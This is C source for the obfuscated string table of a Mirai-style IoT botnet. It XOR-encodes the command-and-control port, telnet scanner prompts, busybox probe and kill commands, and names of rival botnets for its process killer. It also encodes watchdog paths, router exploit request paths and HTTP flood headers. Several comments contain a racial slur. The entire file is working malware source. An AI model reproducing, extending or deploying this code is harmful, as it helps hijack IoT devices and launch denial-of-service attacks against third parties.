#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xdeadbeef;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{   
    add_entry(TABLE_CNC_PORT, "\xA7\xE3", 2); // 
    add_entry(TABLE_SCAN_CB_PORT, "\xBB\x56", 2); // \xBB\x56 39284       \xA1\xEC  33742
    add_entry(TABLE_EXEC_SUCCESS, "\x60\x67\x63\x71\x76\x6F\x6D\x66\x67\x0F\x60\x6B\x76\x61\x6A\x67\x71\x62\x62\x22", 26); // FREEK

    add_entry(TABLE_KILLER_PROC, "\x0D\x52\x50\x4D\x41\x0D\x22", 7);
    add_entry(TABLE_KILLER_EXE, "\x0D\x47\x5A\x47\x22", 5);
    add_entry(TABLE_KILLER_DELETED, "\x02\x0A\x46\x47\x4E\x47\x56\x47\x46\x0B\x22", 11);
    add_entry(TABLE_KILLER_FD, "\x0D\x44\x46\x22", 4);
    add_entry(TABLE_KILLER_ANIME, "\x0C\x43\x4C\x4B\x4F\x47\x22", 7);
    add_entry(TABLE_KILLER_STATUS, "\x0D\x51\x56\x43\x56\x57\x51\x22", 8);

    // add mem killers here
    add_entry(TABLE_EXEC_MIRAI, "\x46\x54\x50\x6A\x47\x4E\x52\x47\x50\x22", 10); // dvrHelper
    add_entry(TABLE_EXEC_SORA1, "\x6C\x4B\x65\x65\x47\x70\x14\x1B\x5A\x46\x22", 11); // NiGGeR69xd
    add_entry(TABLE_EXEC_SORA2, "\x13\x11\x11\x15\x71\x4D\x50\x43\x6E\x6D\x63\x66\x67\x70\x22", 15); // 1337SoraLOADER
    add_entry(TABLE_EXEC_SORA3, "\x6C\x4B\x65\x65\x47\x70\x46\x12\x4C\x49\x51\x13\x11\x11\x15\x22", 16); // NiGGeRd0nks1337
    add_entry(TABLE_EXEC_OWARI, "\x7A\x13\x1B\x6B\x10\x11\x1B\x13\x10\x16\x77\x6B\x77\x22", 14); // X19I239124UIU
    add_entry(TABLE_EXEC_OWARI2, "\x6B\x57\x7B\x45\x57\x48\x47\x6B\x53\x4C\x22", 11); // IuYgujeIqn
    add_entry(TABLE_EXEC_JOSHO, "\x13\x16\x64\x43\x22", 5); // 14Fa
    add_entry(TABLE_EXEC_APOLLO, "\x41\x41\x63\x66\x22", 5); // ccAD
    add_entry(TABLE_EXEC_ROUTE, "\x0D\x52\x50\x4D\x41\x0D\x4C\x47\x56\x0D\x50\x4D\x57\x56\x47\x22", 16); // /proc/net/route
    add_entry(TABLE_EXEC_CPUINFO, "\x0D\x52\x50\x4D\x41\x0D\x41\x52\x57\x4B\x4C\x44\x4D\x22", 14); // /proc/cpuinfo
    add_entry(TABLE_EXEC_BOGO, "\x60\x6D\x65\x6D\x6F\x6B\x72\x71\x22", 9); // BOGOMIPS
    add_entry(TABLE_EXEC_RC, "\x0D\x47\x56\x41\x0D\x50\x41\x0C\x46\x0D\x50\x41\x0C\x4E\x4D\x41\x43\x4E\x22", 19); // /etc/rc.d/rc.local
    add_entry(TABLE_EXEC_MASUTA1, "\x45\x13\x43\x40\x41\x16\x46\x4F\x4D\x11\x17\x4A\x4C\x52\x10\x4E\x4B\x47\x12\x49\x48\x44\x22", 23); // g1abc4dmo35hnp2lie0kjf
    add_entry(TABLE_EXEC_MIRAI1, "\x0D\x46\x47\x54\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 14); // /dev/watchdog
    add_entry(TABLE_EXEC_MIRAI2, "\x0D\x46\x47\x54\x0D\x4F\x4B\x51\x41\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 19); // /dev/misc/watchdog
    add_entry(TABLE_EXEC_VAMP1, "\x0D\x46\x47\x54\x0D\x64\x76\x75\x66\x76\x13\x12\x13\x7D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_EXEC_VAMP3, "\x0D\x46\x47\x54\x0D\x4C\x47\x56\x51\x4E\x4B\x4C\x49\x0D\x22", 15); // /dev/netslink/
    add_entry(TABLE_EXEC_IRC1, "\x72\x70\x6B\x74\x6F\x71\x65\x22", 8); // PRIVMSG
    add_entry(TABLE_EXEC_QBOT1, "\x65\x67\x76\x6E\x6D\x61\x63\x6E\x6B\x72\x22", 11); // GETLOCALIP
    add_entry(TABLE_EXEC_QBOT2, "\x69\x6B\x6E\x6E\x63\x76\x76\x69\x22", 9); // KILLATTK
    add_entry(TABLE_EXEC_IRC2, "\x67\x43\x56\x51\x1A\x22", 6); // Eats8
    add_entry(TABLE_EXEC_MIRAI3, "\x54\x79\x12\x54\x22", 5); // v[0v
    add_entry(TABLE_EXEC_OMNI, "\x1B\x11\x6D\x44\x48\x6A\x78\x10\x58\x22", 10); // 93OfjHZ2z
    add_entry(TABLE_EXEC_LOL, "\x65\x4A\x4D\x51\x56\x75\x57\x58\x6A\x47\x50\x47\x14\x14\x14\x22", 15); // GhostWuzHere666
    add_entry(TABLE_EXEC_SHINTO3, "\x75\x51\x65\x63\x16\x62\x64\x14\x64\x22", 10); // WsGA4@F6F
    add_entry(TABLE_EXEC_SHINTO5, "\x63\x61\x66\x60\x22", 5); // ACDB
    add_entry(TABLE_EXEC_JOSHO5, "\x63\x40\x63\x46\x22", 5); // AbAd
    add_entry(TABLE_EXEC_JOSHO4, "\x4B\x43\x65\x54\x22", 5); // iaGv

    add_entry(PROC_SELF_EXE, "\x0D\x52\x50\x4D\x41\x0D\x51\x47\x4E\x44\x0D\x47\x5A\x47\x22", 15);
    add_entry(TABLE_SCAN_SHELL, "\x51\x4A\x47\x4E\x4E\x22", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x47\x4C\x43\x40\x4E\x47\x22", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x51\x5B\x51\x56\x47\x4F\x22", 7);
    add_entry(TABLE_SCAN_SH, "\x51\x4A\x22", 3);
    add_entry(TABLE_SCAN_QUERY, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x77\x6C\x71\x76\x22", 18); // /bin/busybox UNST
    add_entry(TABLE_SCAN_RESP, "\x77\x6C\x71\x76\x18\x02\x43\x52\x52\x4E\x47\x56\x02\x4C\x4D\x56\x02\x44\x4D\x57\x4C\x46\x22", 23); // UNST: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x4C\x41\x4D\x50\x50\x47\x41\x56\x22", 9);
    add_entry(TABLE_SCAN_PS, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x52\x51\x22", 16);
    add_entry(TABLE_SCAN_KILL_9, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x49\x4B\x4E\x4E\x02\x0F\x1B\x02\x22", 22);

    add_entry(TABLE_ATK_VSE, "\x76\x71\x4D\x57\x50\x41\x47\x02\x67\x4C\x45\x4B\x4C\x47\x02\x73\x57\x47\x50\x5B\x22", 21);
    add_entry(TABLE_ATK_RESOLVER, "\x0D\x47\x56\x41\x0D\x50\x47\x51\x4D\x4E\x54\x0C\x41\x4D\x4C\x44\x22", 17);
    add_entry(TABLE_ATK_NSERV, "\x4C\x43\x4F\x47\x51\x47\x50\x54\x47\x50\x02\x22", 12);

    add_entry(TABLE_ATK_KEEP_ALIVE, "\x61\x4D\x4C\x4C\x47\x41\x56\x4B\x4D\x4C\x18\x02\x49\x47\x47\x52\x0F\x43\x4E\x4B\x54\x47\x22", 23);
    add_entry(TABLE_ATK_ACCEPT, "\x63\x41\x41\x47\x52\x56\x18\x02\x56\x47\x5A\x56\x0D\x4A\x56\x4F\x4E\x0E\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x4A\x56\x4F\x4E\x09\x5A\x4F\x4E\x0E\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x4F\x4E\x19\x53\x1F\x12\x0C\x1B\x0E\x4B\x4F\x43\x45\x47\x0D\x55\x47\x40\x52\x0E\x08\x0D\x08\x19\x53\x1F\x12\x0C\x1A\x22", 83);
    add_entry(TABLE_ATK_ACCEPT_LNG, "\x63\x41\x41\x47\x52\x56\x0F\x6E\x43\x4C\x45\x57\x43\x45\x47\x18\x02\x47\x4C\x0F\x77\x71\x0E\x47\x4C\x19\x53\x1F\x12\x0C\x1A\x22", 32);
    add_entry(TABLE_ATK_CONTENT_TYPE, "\x61\x4D\x4C\x56\x47\x4C\x56\x0F\x76\x5B\x52\x47\x18\x02\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x0F\x55\x55\x55\x0F\x44\x4D\x50\x4F\x0F\x57\x50\x4E\x47\x4C\x41\x4D\x46\x47\x46\x22", 48);
    add_entry(TABLE_ATK_SET_COOKIE, "\x51\x47\x56\x61\x4D\x4D\x49\x4B\x47\x0A\x05\x22", 12);
    add_entry(TABLE_ATK_REFRESH_HDR, "\x50\x47\x44\x50\x47\x51\x4A\x18\x22", 9);
    add_entry(TABLE_ATK_LOCATION_HDR, "\x4E\x4D\x41\x43\x56\x4B\x4D\x4C\x18\x22", 10);
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x51\x47\x56\x0F\x41\x4D\x4D\x49\x4B\x47\x18\x22", 12);
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x41\x4D\x4C\x56\x47\x4C\x56\x0F\x4E\x47\x4C\x45\x56\x4A\x18\x22", 16);
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x56\x50\x43\x4C\x51\x44\x47\x50\x0F\x47\x4C\x41\x4D\x46\x4B\x4C\x45\x18\x22", 19);
    add_entry(TABLE_ATK_CHUNKED, "\x41\x4A\x57\x4C\x49\x47\x46\x22", 8);
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x49\x47\x47\x52\x0F\x43\x4E\x4B\x54\x47\x22", 11);
    add_entry(TABLE_ATK_CONNECTION_HDR, "\x41\x4D\x4C\x4C\x47\x41\x56\x4B\x4D\x4C\x18\x22", 12);
    add_entry(TABLE_ATK_DOSARREST, "\x51\x47\x50\x54\x47\x50\x18\x02\x46\x4D\x51\x43\x50\x50\x47\x51\x56\x22", 18);
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x51\x47\x50\x54\x47\x50\x18\x02\x41\x4E\x4D\x57\x46\x44\x4E\x43\x50\x47\x0F\x4C\x45\x4B\x4C\x5A\x22", 25);

   
	add_entry(TABLE_MISC_WATCHDOG, "\x0D\x46\x47\x54\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 14);
	add_entry(TABLE_MISC_WATCHDOG2, "\x0D\x46\x47\x54\x0D\x4F\x4B\x51\x41\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 19);
	
	add_entry(TABLE_SCAN_ASSWORD, "\x43\x51\x51\x55\x4D\x50\x46\x22", 8);
	add_entry(TABLE_SCAN_OGIN, "\x4D\x45\x4B\x4C\x22", 5);
	add_entry(TABLE_SCAN_ENTER, "\x47\x4C\x56\x47\x50\x22", 6);
	
	add_entry(TABLE_MISC_RAND, "\x46\x49\x43\x4D\x55\x48\x44\x4B\x50\x4A\x4B\x43\x46\x13\x48\x11\x47\x46\x48\x49\x43\x4B\x22", 23);


    add_entry(TABLE_KILLER_CWD, "\x0D\x41\x55\x46\x22", 5); 
    // "/var/tmp"
    add_entry(TABLE_KILLER_VAR_TMP, "\x0D\x54\x43\x50\x0D\x56\x4F\x52\x22", 9); 
    // "/var"
    add_entry(TABLE_KILLER_VAR, "\x0D\x54\x43\x50\x22", 5);
    // ogin
    add_entry(TABLE_SCAN_OGIN, "\x4D\x45\x4B\x4C\x22", 5); 

        // "/maps"
    add_entry(TABLE_KILLER_MAPS, "\x0D\x4F\x43\x52\x51\x22", 6);
    // "/proc/net/tcp"
    add_entry(TABLE_KILLER_TCP, "\x0D\x52\x50\x4D\x41\x0D\x4C\x47\x56\x0D\x56\x41\x52\x22", 14);
    // "UPX!"
    add_entry(TABLE_KILLER_UPX, "\x77\x72\x7A\x03\x22", 5);
    // "POST /wanipcn.xml"
    add_entry(TABLE_KILLER_REP1, "\x72\x6D\x71\x76\x02\x0D\x55\x43\x4C\x4B\x52\x41\x4C\x0C\x5A\x4F\x4E\x22", 18);
    // "POST /picdesc.xml"
    add_entry(TABLE_KILLER_REP2, "\x72\x6D\x71\x76\x02\x0D\x52\x4B\x41\x46\x47\x51\x41\x0C\x5A\x4F\x4E\x22", 18);
    // "POST /ctrlt/"
    add_entry(TABLE_KILLER_REP3, "\x72\x6D\x71\x76\x02\x0D\x41\x56\x50\x4E\x56\x0D\x22", 13);
    // "POST /HNAP1/"
    add_entry(TABLE_KILLER_REP4, "\x72\x6D\x71\x76\x02\x0D\x6A\x6C\x63\x72\x13\x0D\x22", 13);
    // "GET /login.cgi"
    add_entry(TABLE_KILLER_REP5, "\x65\x67\x76\x02\x0D\x4E\x4D\x45\x4B\x4C\x0C\x41\x45\x4B\x22", 15);
    // "POST /tmUnblock.cgi"
    add_entry(TABLE_KILLER_REP6, "\x72\x6D\x71\x76\x02\x0D\x56\x4F\x77\x4C\x40\x4E\x4D\x41\x49\x0C\x41\x45\x4B\x22", 20);
    // "POST /cgi-bin/"
    add_entry(TABLE_KILLER_REP7, "\x72\x6D\x71\x76\x02\x0D\x41\x45\x4B\x0F\x40\x4B\x4C\x0D\x22", 15);
    // "POST /GponForm/"
    add_entry(TABLE_KILLER_REP8, "\x72\x6D\x71\x76\x02\x0D\x65\x52\x4D\x4C\x64\x4D\x50\x4F\x0D\x22", 16);
    // "GET /index.php"
    add_entry(TABLE_KILLER_REP9, "\x65\x67\x76\x02\x0D\x4B\x4C\x46\x47\x5A\x0C\x52\x4A\x52\x22", 15);
    // "GET /shell"
    add_entry(TABLE_KILLER_REP10, "\x65\x67\x76\x02\x0D\x51\x4A\x47\x4E\x4E\x22", 11);


    add_entry(PROC_SELF_COMM, "\x0D\x52\x50\x4D\x41\x0D\x51\x47\x4E\x44\x0D\x41\x4D\x4F\x4F\x22", 11);
    add_entry(PROC_SELF_CMDLINE, "\x0D\x52\x50\x4D\x41\x0D\x51\x47\x4E\x44\x0D\x41\x4F\x46\x4E\x4B\x4C\x47\x22", 11);

}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
uint16_t table_retrieve_val_len(uint8_t id)
{
    return table[id].val_len;
}
